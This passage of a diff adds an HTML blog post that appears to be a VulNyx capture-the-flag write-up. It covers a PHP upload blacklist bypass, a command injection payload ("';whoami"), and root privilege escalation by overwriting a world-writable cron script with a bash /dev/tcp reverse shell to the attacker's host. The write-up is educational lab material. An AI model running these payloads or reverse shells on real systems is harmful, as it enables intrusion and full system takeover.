+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// If the file extension is allowed</span>
+
+            <span class="c1">// Try to upload the file</span>
+            <span class="nv">$file_upload_path</span> <span class="o">=</span> <span class="nv">$data_upload_directory</span> <span class="mf">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span>
+            <span class="nv">$successful_upload</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file_tmp_name</span><span class="p">,</span> <span class="nv">$file_upload_path</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$successful_upload</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// If the upload was successful</span>
+
+                <span class="k">echo</span> <span class="s2">"The file "</span> <span class="mf">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">" has been uploaded"</span><span class="p">;</span>
+
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// If the upload was unsuccessful</span>
+
+                <span class="k">echo</span> <span class="s2">"An error occurred. Please contact the administrator."</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>The code is is very understandable with the comments so it doesn’t require much explanation, but the vulnerability is in the following line</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Set the not allowed file extensions</span>
+<span class="nv">$not_allowed_file_extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'php'</span><span class="p">];</span> <span class="c1">// These will be the only file extensions allowed</span>
+</code></pre></div></div>
+
+<p>because <strong>it is using a blacklist of not allowed extensions</strong>. It is only blocking the upload of files with <em>php</em> and <em>sh</em> extensions but allowing other extensions that are also interpretable by a PHP backend, such as <em>phtml</em>. That is why <strong>it is recommended to use a whitelist of allowed extensions and if possible other additional measures such as content checking</strong>.</p>
+
+<p>Additionally, if we scour the code we can identify another critical vulnerability… can you find it?</p>
+
+<p>Here it goes. In the following code, which is the one used to save the user’s data in a txt, there is a command injection</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Store the name and the phone number of the user in a txt file</span>
+<span class="nv">$user_data</span><span class="o">=</span><span class="s2">"Name: </span><span class="nv">$name</span><span class="se">\n</span><span class="s2">Phone number: </span><span class="nv">$phone_number</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$save_user_data_command</span><span class="o">=</span><span class="s2">"echo '</span><span class="nv">$user_data</span><span class="s2">' &gt; </span><span class="nv">$data_upload_directory</span><span class="s2">/userinfo.txt"</span><span class="p">;</span>
+<span class="nb">system</span><span class="p">(</span><span class="nv">$save_user_data_command</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>In this code the <em>system</em> function is executed taking as input the user’s data without sanitizing. Therefore, sending the following payload</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HackCommander';whoami
+</code></pre></div></div>
+
+<p>the following response is obtained</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/command-injection.png" alt=""></p>
+
+<p>The presence of this vulnerability does not affect the difficulty of the machine as this method is more difficult to find and exploit than arbitrary file uploading. This is why the machine remains easy.</p>
+
+<div id="section-id-3"></div>
+
+<h2 id="3-privilege-escalation">3. Privilege escalation</h2>
+
+<div id="section-id-3-1"></div>
+
+<h2 id="31-detecting-the-cronjob-vulnerability">3.1. Detecting the cronjob vulnerability</h2>
+
+<p>Taking a look at the candidate user’s home we can see that there is a hidden directory <em>.scripts</em> with a script named <em>makeBackup.sh</em></p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">pwd</span>
+<span class="go">/var/www/html
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/candidate
+<span class="gp">$</span><span class="w"> </span><span class="nb">pwd</span>
+<span class="go">/home/candidate
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 36
+drwx------ 5 candidate candidate 4096 Mar 28 10:56 .
+drwxr-xr-x 3 root      root      4096 Mar 28 10:11 ..
+drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:53 .backups
+</span><span class="gp">lrwxrwxrwx 1 root      root         9 Nov 15 10:43 .bash_history -&gt;</span><span class="w"> </span>/dev/null
+<span class="go">-rw-r--r-- 1 candidate candidate  220 Nov 15 10:23 .bash_logout
+-rw-r--r-- 1 candidate candidate 3526 Nov 15 10:23 .bashrc
+drwxr-xr-x 3 candidate candidate 4096 Mar 28 10:56 .local
+-rw-r--r-- 1 candidate candidate  807 Nov 15 10:23 .profile
+drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .scripts
+-r-------- 1 candidate candidate   33 Mar 28 10:31 user.txt
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> .scripts
+<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 12
+drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .
+drwx------ 5 candidate candidate 4096 Mar 28 10:56 ..
+-rwxrwxrwx 1 candidate candidate  399 Mar 28 10:57 makeBackup.sh
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>makeBackup.sh
+<span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span>Source folder to be backed up
+<span class="go">source_folder="/var/www/html/uploads/"
+
+</span><span class="gp">#</span><span class="w"> </span>Destination folder <span class="k">for </span>the backup
+<span class="go">backup_folder="/home/candidate/.backups/"
+
+</span><span class="gp">#</span><span class="w"> </span>Create backup folder <span class="k">if </span>it doesn<span class="s1">'t exist
+</span><span class="gp">mkdir -p "$</span><span class="s1">backup_folder"
+</span><span class="go">
+</span><span class="gp">#</span><span class="w"> </span>Backup file name
+<span class="gp">backup_file="$</span><span class="o">{</span>backup_folder<span class="o">}</span>backup.tar.gz<span class="s2">"
+</span><span class="go">
+</span><span class="gp">#</span><span class="w"> </span>Create a compressed <span class="nb">tar </span>archive of the <span class="nb">source </span>folder
+<span class="gp">tar -czf "$</span>backup_file<span class="s2">" -C "</span><span class="nv">$source_folder</span><span class="s2">" .
+</span></code></pre></div></div>
+
+<p>This script is used to backup the directory <em>/var/www/html/uploads/</em> (the data uploaded by candidates) and save it to the file <em>/home/candidate/.backups/backup.tar.gz</em>. Backing up is always a good idea and in this case the sysadmin tries to make sure that the data uploaded by the user is safe. One important thing is that the main characteristic of backups is that they are <strong>periodic</strong> tasks, so it would not be unusual for the machine to have some recurring task configured to run this script. In linux these tasks are called <a href="https://cronitor.io/guides/cron-jobs">cronjobs</a>.</p>
+
+<p>We can check which cronjobs the machine has configured as follows</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /etc/crontab
+<span class="gp">#</span><span class="w"> </span>/etc/crontab: system-wide crontab
+<span class="gp">#</span><span class="w"> </span>Unlike any other crontab you don<span class="s1">'t have to run the `crontab'</span>
+<span class="gp">#</span><span class="w"> </span><span class="nb">command </span>to <span class="nb">install </span>the new version when you edit this file
+<span class="gp">#</span><span class="w"> </span>and files <span class="k">in</span> /etc/cron.d. These files also have username fields,
+<span class="gp">#</span><span class="w"> </span>that none of the other crontabs <span class="k">do</span><span class="nb">.</span>
+<span class="go">
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+</span><span class="gp">#</span><span class="w"> </span>Example of job definition:
+<span class="gp">#</span><span class="w"> </span>.---------------- minute <span class="o">(</span>0 - 59<span class="o">)</span>
+<span class="gp">#</span><span class="w"> </span>|  .------------- hour <span class="o">(</span>0 - 23<span class="o">)</span>
+<span class="gp">#</span><span class="w"> </span>|  |  .---------- day of month <span class="o">(</span>1 - 31<span class="o">)</span>
+<span class="gp">#</span><span class="w"> </span>|  |  |  .------- month <span class="o">(</span>1 - 12<span class="o">)</span> OR jan,feb,mar,apr ...
+<span class="gp">#</span><span class="w"> </span>|  |  |  |  .---- day of week <span class="o">(</span>0 - 6<span class="o">)</span> <span class="o">(</span><span class="nv">Sunday</span><span class="o">=</span>0 or 7<span class="o">)</span> OR sun,mon,tue,wed,thu,fri,sat
+<span class="gp">#</span><span class="w"> </span>|  |  |  |  |
+<span class="gp">#</span><span class="w"> </span><span class="k">*</span>  <span class="k">*</span>  <span class="k">*</span>  <span class="k">*</span>  <span class="k">*</span> user-name <span class="nb">command </span>to be executed
+<span class="go">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+</span><span class="gp">25 6    * * *   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.daily;</span><span class="w"> </span><span class="o">}</span>
+<span class="gp">47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.weekly;</span><span class="w"> </span><span class="o">}</span>
+<span class="gp">52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.monthly;</span><span class="w"> </span><span class="o">}</span>
+<span class="gp">#</span><span class="w">
+</span><span class="go">* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
+</span></code></pre></div></div>
+
+<p>Indeed, there is a line containing a reference to this script</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">* * * * * root /bin/sh /home/candidate/Scripts/makeBackup.sh
+</span></code></pre></div></div>
+
+<p>but it is necessary to understand it. The meaning of each one of the elements of the line is</p>
+
+<ul>
+  <li>The first asterisk indicates the minute of each hour in which the task will be executed. In this case, using an asterisk means that it will be executed every minute.</li>
+  <li>The second asterisk indicates the hour of the day when the task will be executed. When configured with an asterisk, the task will be executed at all hours.</li>
+  <li>The third asterisk indicates the day of the month on which the task will run. Again, when using an asterisk, the task will be executed on all days of the month.</li>
+  <li>The fourth asterisk indicates the month in which the task will be executed. When set with an asterisk, the task will be executed in all months.</li>
+  <li>The fifth asterisk indicates the day of the week on which the task will be executed. When using an asterisk, the task will be executed on all days of the week (Monday through Sunday).</li>
+  <li>The word <em>root</em> specifies the user under which the task will be executed.</li>
+  <li>The word <em>/bin/sh</em> is the path to the shell interpreter that will be used to execute the script.</li>
+  <li>
+<em>/home/candidate/.scripts/makeBackup.sh</em> is the path of the script to be executed during the task.</li>
+</ul>
+
+<p>In a nutshell, <strong>the script <em>/home/candidate/.scripts/makeBackup.sh</em> is executed every minute by the <em>root</em> user</strong>. In this case there is no reason for the cronjob to be executed with the <em>root</em> user because all the directories involved are accessible with the <em>candidate</em> user. However, it is not uncommon to find this type of configuration due to carelessness and convenience of the sysadmins because the <em>root</em> user will never throw a permissions denied.</p>
+
+<p>If we combine this with the fact that, as we saw before, <strong>the <em>makeBackup.sh</em> script has read, write and execute permissions for all users</strong>, we are 100% sure that we already have a vector to escalate privileges to <em>root</em>.</p>
+
+<div id="section-id-3-2"></div>
+
+<h2 id="32-getting-a-shell-as-root">3.2. Getting a shell as root</h2>
+
+<p>The strategy now is to execute a shell of the type</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>/bin/bash
+<span class="gp">bash -c 'bash -i &gt;</span>&amp; /dev/tcp/10.0.2.15/1235 0&gt;&amp;1<span class="s1">'
+</span></code></pre></div></div>
+
+<p>Setting up a listener on the attacking machine on port 1235</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nc -nlvp 1235
+</span></code></pre></div></div>
+
+<p>and then executing the following code on the target machine</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">pwd</span>
+<span class="go">/home/candidate/.scripts
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"#/bin/bash</span><span class="se">\n</span><span class="s2">bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.15/1235 0&gt;&amp;1'"</span> <span class="o">&gt;</span> makeBackup.sh
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>makeBackup.sh
+<span class="gp">-e #</span>/bin/bash
+<span class="gp">bash -c 'bash -i &gt;</span>&amp; /dev/tcp/10.0.2.15/1235 0&gt;&amp;1<span class="s1">'
+</span></code></pre></div></div>
+
+<p>After a few seconds (at the most you have to wait 1 minute), we receive the <em>root</em> shell</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-nlvp</span> 1235 
+<span class="go">listening on [any] 1235 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 47866
+bash: cannot set terminal process group (3479): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@Diff3r3ntS3c:~#</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">whoami
+root
+</span><span class="gp">root@Diff3r3ntS3c:~#</span><span class="w"> </span><span class="nb">pwd</span>
+<span class="go">pwd
+/root
+</span><span class="gp">root@Diff3r3ntS3c:~#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ls
+root.txt
+</span></code></pre></div></div>
+
+<p>and we can see that the root flag is in <em>/root/root.txt</em>.</p>
+
+<div id="section-id-3-3"></div>
+
+<h2 id="33-why-does-this-privilege-escalation-via-cronjob-exist">3.3. Why does this privilege escalation via cronjob exist?</h2>
+
+<p>This method worked because 2 conditions were met at the same time:</p>
+
+<ul>
+  <li>The cronjob is executed with the <em>root</em> user.</li>
+  <li>The script that runs the cronjob is editable by any user.</li>
+</ul>
+
+<p><strong>Both conditions are necessary to perform this privilege escalation.</strong> To understand it better, let’s think what would happen if one of the 2 conditions were not met:</p>
+
+<ul>
+  <li>If the cronjob is not executed as <em>root</em> user but for example with the <em>candidate</em> user, then even if we could modify the script <em>makeBackup.sh</em>, we would get a shell with the <em>candidate</em> user.</li>
+  <li>If the script that is executed is not editable by any user then there is no way to intervene in the cronjob execution flow, at least by directly editing the script. The only thing we could do is to look for other scripts or functionalities that allow to write in the <em>makeBackup.sh</em> script to inject code in the cronjob. This is too specific and does not have to happen.</li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#arbitrary-file-upload" class="page__taxonomy-item" rel="tag">arbitrary file upload</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#burpsuite" class="page__taxonomy-item" rel="tag">burpsuite</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cronjob" class="page__taxonomy-item" rel="tag">cronjob</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#directory-listing" class="page__taxonomy-item" rel="tag">directory listing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ffuf" class="page__taxonomy-item" rel="tag">ffuf</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#nmap" class="page__taxonomy-item" rel="tag">nmap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#vulnyx" class="page__taxonomy-item" rel="tag">vulnyx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">ctf</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-04-08T00:00:00+02:00">April 08, 2024</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/posts/2024/03/31/vulnyx-hackingstation/" class="pagination--pager" title="VulNyx: HackingStation
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+  <script src="/assets/scripts/copyCode.js"></script>
+
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+<div style="background-color: #333; padding: 20px; text-align: center;">
+  <p style="color: white; font-size: 24px;">⭐ Liked this blog? Give it a <a href="https://github.com/HackCommander/hackcommander.github.io" style="color: white; font-weight: bold;">GitHub star</a>! ⭐</p>
+  <p style="color: white; font-size: 24px;">🔎 Connect with me on <a href="https://www.linkedin.com/in/%E2%98%91iv%C3%A1n-santos-malpica-1023a11b4/" style="color: white; font-weight: bold;">LinkedIn</a> for more hacking and bug bounty content! 🔎</p>
+  <p style="color: white; font-size: 24px;">🛍️ Interested in the products I use? Check out my <a href="https://hackcommander.github.io/advertising/" style="color: white; font-weight: bold;">recommended products</a> page for nice deals! 🛍️</p>
+  <p style="color: white; font-size: 24px;">☕️ If you found this blog helpful, consider <a href="https://www.buymeacoffee.com/ivansantos" style="color: white; font-weight: bold;">buying me a coffee</a>. Thanks a latte! ☕️</p>
+</div>
+<!-- end custom footer snippets -->
+
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2024 Iván Santos Malpica</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JGTZF7HYRM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-JGTZF7HYRM');
+</script>
+
+
+
+  </body>
+</html>
